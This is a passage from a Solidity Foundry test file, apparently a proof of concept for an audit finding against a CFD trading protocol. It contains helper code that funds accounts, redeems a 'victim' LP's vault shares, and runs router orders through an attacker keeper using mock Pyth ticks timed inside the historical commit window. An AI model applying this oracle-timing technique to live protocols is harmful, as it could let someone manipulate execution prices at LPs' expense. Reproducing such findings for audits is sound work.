    ) internal {
        _credit(account, amount);
        vm.startPrank(account);
        IERC20(USDC).forceApprove(address(clearinghouse), amount);
        clearinghouse.deposit(account, amount);
        vm.stopPrank();
    }

    function _redeemAll(
        address lp
    ) internal returns (uint256 assets) {
        uint256 unlock = juniorVault.lastDepositTime(lp) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < unlock) _advanceTo(unlock);
        uint256 shares = juniorVault.balanceOf(lp);
        vm.prank(lp);
        uint256 requestId = juniorVault.requestRedeem(shares, lp, lp);
        _advanceTo(pool.lpEpochStart(requestId));
        _publish(int64(int256(CAP_PRICE)));
        router.settleLpEpoch(new bytes[](0));
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, lp);
        require(claimable == shares, "victim redeem was not fully funded");
        vm.prank(lp);
        assets = juniorVault.claimRedeem(requestId, claimable, lp, lp);
    }

    function _commitAndExecute(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        int64 price,
        bool isClose
    ) internal returns (uint64 orderId) {
        orderId = router.nextCommitId();
        OrderV3Types.OrderRequest memory request = _request(account, side, size, margin, targetPrice, isClose);
        vm.prank(account);
        router.commitOrder(request);
        // The historical window is (stored commit, stored commit + 1] when execution is the next second.
        // A local copy of block.timestamp is rewritten by via-IR after the warp and misses that window.
        uint256 commitTime = attackerKeeper.storedCommitTime(router, orderId);
        console2.log("router order", orderId);
        console2.log("router stored commit time", commitTime);
        _advanceTo(commitTime + 1);
        commitTime = attackerKeeper.storedCommitTime(router, orderId);
        uint256 publishTime = commitTime + 1;
        uint256 executeAt = vm.getBlockTimestamp();
        console2.log("router historical publish time", publishTime);
        console2.log("router execute timestamp", executeAt);
        require(executeAt == publishTime, "historical tick is outside the order window");
        OrderV3Types.ExecutionResult memory result =
            router.executeOrder(orderId, _tick(price, publishTime, commitTime));
        console2.log("router execution status", uint256(result.status));
        console2.log("router pending reason", uint256(result.pendingReason));
        console2.log("router terminal reason", uint256(result.terminalReason));
        require(result.status == OrderV3Types.LifecycleStatus.Executed, "router order did not execute");
    }

    function _request(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 deadline = block.timestamp + router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("F599CleanFork", block.chainid, address(router), account, router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(deadline),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _publish(
        int64 price
    ) internal {
        router.updateMarkPrice(_tick(price, block.timestamp, block.timestamp - 1));
    }

    function _executedPrice(
        uint64 orderId
    ) internal returns (uint256 price) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 topic = keccak256("OrderExecuted(uint64,uint256)");
        bytes32 idTopic = bytes32(uint256(orderId));
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics.length > 1 && logs[i].topics[0] == topic && logs[i].topics[1] == idTopic) {
                return abi.decode(logs[i].data, (uint256));
            }
        }
        revert("close execution price was not logged");
    }

    function _tick(
        int64 price,
        uint256 publishTime,
        uint256 prevPublishTime
    ) internal pure returns (bytes[] memory updateData) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](1);
        updates[0] = MockPyth.FeedUpdate({
            id: FEED_ID,
            price: MockPyth.MockPrice({
                price: price,
                conf: 0,
                expo: -8,
                publishTime: publishTime,
                prevPublishTime: prevPublishTime
            })
        });
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    receive() external payable {}

}

```
